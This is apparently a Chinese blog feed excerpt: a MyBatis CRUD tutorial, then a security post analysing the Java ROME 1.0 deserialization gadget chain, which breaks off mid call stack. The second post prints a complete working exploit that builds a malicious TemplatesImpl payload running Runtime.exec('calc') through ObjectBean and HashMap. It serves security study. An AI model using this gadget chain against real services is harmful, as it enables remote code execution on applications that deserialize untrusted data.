<p>UserMapper接口中添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;User&gt; <span class="title function_">selectByConditionSingle</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure>

<p>测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">selectByConditiconSingle</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取请求参数对象</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    <span class="comment">// address = &quot;%&quot; + address + &quot;%&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装对象</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setAge(age);</span><br><span class="line">    <span class="comment">// user.setAddress(address);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.读取配置文件</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.创建SqlSessionFactory工厂</span></span><br><span class="line">    <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">    <span class="comment">// 3.使用工厂生产SqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">    <span class="comment">// 4.1 获取UserMapper接口的代理对象</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">userMapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="comment">// 4.2 执行SQL语句</span></span><br><span class="line">    <span class="comment">// 使用UserMapper接口方法2</span></span><br><span class="line">    List&lt;User&gt; users = userMapper.selectByConditionSingle(user);</span><br><span class="line">    System.out.print(users);</span><br><span class="line">    <span class="comment">// 5.释放资源</span></span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h1><h2 id="添加-1"><a href="#添加-1" class="headerlink" title="添加"></a>添加</h2><p>添加一个用户</p>
<p>UserMapper.xml中添加SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">    insert into tb_user (username, password, age, address)</span><br><span class="line">    values (#&#123;username&#125;,#&#123;password&#125;,#&#123;age&#125;,#&#123;address&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>UserMapper接口中添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加用户</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure>

<p>测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Add</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取请求参数对象</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;liliu&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装对象</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setUsername(username);</span><br><span class="line">    user.setPassword(password);</span><br><span class="line">    user.setAge(age);</span><br><span class="line">    user.setAddress(address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.读取配置文件</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.创建SqlSessionFactory工厂</span></span><br><span class="line">    <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">    <span class="comment">// 3.使用工厂生产SqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">    <span class="comment">// 4.1 获取UserMapper接口的代理对象</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">userMapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="comment">// 4.2 执行SQL语句</span></span><br><span class="line">    userMapper.add(user);</span><br><span class="line">    <span class="comment">// 提交事务</span></span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    <span class="comment">// 5.释放资源</span></span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：在设置自动提交后<code>SqlSession sqlSession = sqlSessionFactory.openSession(true);</code>，就不需要手动提交事务了<code>sqlSession.commit();</code></p>
<h2 id="添加-主键返回"><a href="#添加-主键返回" class="headerlink" title="添加-主键返回"></a>添加-主键返回</h2><p>UserMapper.xml中修改SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">useGeneratedKeys</span>=<span class="string">&quot;true&quot;</span> <span class="attr">keyProperty</span>=<span class="string">&quot;id&quot;</span>&gt;</span></span><br><span class="line">    insert into tb_user (username, password, age, address)</span><br><span class="line">    values (#&#123;username&#125;,#&#123;password&#125;,#&#123;age&#125;,#&#123;address&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就将添加数后的id值绑定到了对象中，通过对象的getid方法就可获取主键的返回</p>
<h1 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h1><h2 id="修改全部属性"><a href="#修改全部属性" class="headerlink" title="修改全部属性"></a>修改全部属性</h2><p>选择一个用户ID，修改其全部字段数据</p>
<p>UserMapper.xml中添加SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span>&gt;</span></span><br><span class="line">    update tb_user</span><br><span class="line">    set</span><br><span class="line">    username = #&#123;username&#125;,</span><br><span class="line">    password = #&#123;password&#125;,</span><br><span class="line">    age = #&#123;age&#125;,</span><br><span class="line">    address = #&#123;address&#125;</span><br><span class="line">    where id = #&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>UserMapper接口中添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">update</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure>

<p>返回值可以是int类型，这样返回的就是影响的行数</p>
<p>测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Update</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取请求参数对象</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;liliu11&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;11111&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装对象</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setId(id);</span><br><span class="line">    user.setUsername(username);</span><br><span class="line">    user.setPassword(password);</span><br><span class="line">    user.setAge(age);</span><br><span class="line">    user.setAddress(address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.读取配置文件</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.创建SqlSessionFactory工厂</span></span><br><span class="line">    <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">    <span class="comment">// 3.使用工厂生产SqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">    <span class="comment">// 4.1 获取UserMapper接口的代理对象</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">userMapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="comment">// 4.2 执行SQL语句</span></span><br><span class="line">    userMapper.update(user);</span><br><span class="line">    <span class="comment">// 提交事务</span></span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    <span class="comment">// 5.释放资源</span></span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="修改动态字段"><a href="#修改动态字段" class="headerlink" title="修改动态字段"></a>修改动态字段</h2><p>只需要修改属性中的部分字段</p>
<p>UserMapper.xml中修改SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span>&gt;</span></span><br><span class="line">    update tb_user</span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;username != null and username != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            username = #&#123;username&#125;,</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;password != null and password != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            password = #&#123;password&#125;,</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age != null&quot;</span>&gt;</span></span><br><span class="line">            age = #&#123;age&#125;,</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;address != null and address != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            address = #&#123;address&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    where id = #&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h1><h2 id="删除一个"><a href="#删除一个" class="headerlink" title="删除一个"></a>删除一个</h2><p>删除一个对应id的记录</p>
<p>UserMapper.xml中添加SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteById&quot;</span>&gt;</span></span><br><span class="line">    delete from tb_user where id = #&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>UserMapper接口中添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">deleteById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure>

<h2 id="批量删除"><a href="#批量删除" class="headerlink" title="批量删除"></a>批量删除</h2><p>接收的是一个id数组，删除对应id的所有记录</p>
<p>UserMapper.xml中添加SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteByIds&quot;</span>&gt;</span></span><br><span class="line">    delete from tb_user where id</span><br><span class="line">    in </span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;ids&quot;</span> <span class="attr">item</span>=<span class="string">&quot;id&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">        #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>UserMapper接口中添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">deleteByIds</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> <span class="type">int</span>[] ids)</span>;</span><br></pre></td></tr></table></figure>

<h1 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h1><p>Mybatis接口方法中可以接收各种各样的参数，Mybatis底层对于这些参数进行不同的封装处理方式</p>
<p><strong>单个参数：</strong></p>
<ol>
<li><p>POJO类型：直接使用，实体类属性名和参数占位符名称一致</p>
</li>
<li><p>Map集合：直接使用，键名和参数占位符名称一致</p>
</li>
<li><p>Collection：封装为Map集合</p>
<blockquote>
<p>map.put(“collection”, collection集合)</p>
<p>map.put(“arg0”, collection集合)</p>
</blockquote>
</li>
<li><p>List：封装为Map集合</p>
<blockquote>
<p>map.put(“collection”, list集合)</p>
<p>map.put(“list”, list集合)</p>
<p>map.put(“arg0”, list集合)</p>
</blockquote>
</li>
<li><p>Array：封装为Map集合</p>
<blockquote>
<p>map.put(“array”, 数组)</p>
<p>map.put(“arg0”, 数组)</p>
</blockquote>
</li>
<li><p>其他类型：直接使用</p>
</li>
</ol>
<p><strong>多个参数：</strong>封装为Map集合</p>
<blockquote>
<p>map.put(“arg0”, 参数值1)</p>
<p>map.put(“param1”, 参数值1)</p>
<p>map.put(“arg1”, 参数值2)</p>
<p>map.put(“param2”, 参数值2)</p>
</blockquote>
<h1 id="注解完成增删改查"><a href="#注解完成增删改查" class="headerlink" title="注解完成增删改查"></a>注解完成增删改查</h1><ul>
<li>查询：@Select</li>
<li>添加：@Insert</li>
<li>修改：@Update</li>
<li>删除：@Delete</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from tb_user where id = #&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">selectById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注：</strong></p>
<ul>
<li>注解一般完成功能简单的SQL语句</li>
<li>配置文件完成复杂功能</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mybatis.net.cn/">MyBatis中文网</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13569231.html">Java学习之Mybatis框架入门篇 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13575140.html">Java学习之Mybatis框架基础篇 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/ruoli-0/p/13942376.html">MyBatis——MyBatis开发流程 - 城北有个混子 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1MT4y1k7wZ/?vd_source=6dc2f2efefd7eb394087b163a2273f77">视频</a></p>
<h1 id="附"><a href="#附" class="headerlink" title="附"></a>附</h1><p>mysql表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> test;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_user (</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    password <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    age <span class="type">int</span>,</span><br><span class="line">    address <span class="type">varchar</span>(<span class="number">100</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="number">23</span>, <span class="string">&#x27;Beijing&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;456&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;Hangzhou&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user <span class="keyword">values</span> (<span class="number">3</span>, <span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;789&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;Guangzhou&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java基础</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Rome分析与利用</title>
    <url>/2023/04/30/Rome/</url>
    <content><![CDATA[<h1 id="Rome简介"><a href="#Rome简介" class="headerlink" title="Rome简介"></a>Rome简介</h1><p>官方文档：<a href="https://rometools.github.io/rome/">https://rometools.github.io/rome/</a></p>
<blockquote>
<p>ROME is a Java framework for RSS and Atom feeds. It’s open source and licensed under the Apache 2.0 license.<br>ROME includes a set of parsers and generators for the various flavors of syndication feeds, as well as converters to convert from one format to another. The parsers can give you back Java objects that are either specific for the format you want to work with, or a generic normalized SyndFeed class that lets you work on with the data without bothering about the incoming or outgoing feed type.</p>
</blockquote>
<p>ROME 是一个用于 RSS 和 Atom 订阅的 Java 框架。它是开源的，并根据 Apache 2.0 许可授权。</p>
<p>ROME 包括一套解析器和生成器，可用于各种形式的聚合提要，以及将一种格式转换为另一种格式的转换器。解析器可以为您提供特定格式的 Java 对象，或者是通用的规范化 SyndFeed 类，让您可以处理数据，而无需考虑传入或传出的 feed 类型。</p>
<h1 id="相关类"><a href="#相关类" class="headerlink" title="相关类"></a>相关类</h1><p>ObjectBean、EqualsBean、ToStringBean都是可利用类</p>
<p>在ToStringBean的toString方法中，大致意思就是传递一个类，获取该类的set或者get方法，并且能够使用invoke调用，这里就可以利用下面描述的链</p>
<p>另外在EqualsBean的beanHashCode方法中，也同样拥有相关功能</p>
<h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="ObjectBean利用链"><a href="#ObjectBean利用链" class="headerlink" title="ObjectBean利用链"></a>ObjectBean利用链</h1><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">ObjetBean.hashCode()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>

<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RomeSec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectBeanExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">payload</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;dddd&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = payload.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TemplatesImpl对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templateImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFiled(templateImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ToStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templateImpl);</span><br><span class="line">        <span class="comment">// 创建ObjectBean对象</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        setFiled(objectBean,<span class="string">&quot;_toStringBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFiled(objectBean, <span class="string">&quot;_cloneableBean&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建hashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ObjectBean.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ObjectBean.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFiled</span><span class="params">(Object o, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, dddd</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1397</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, 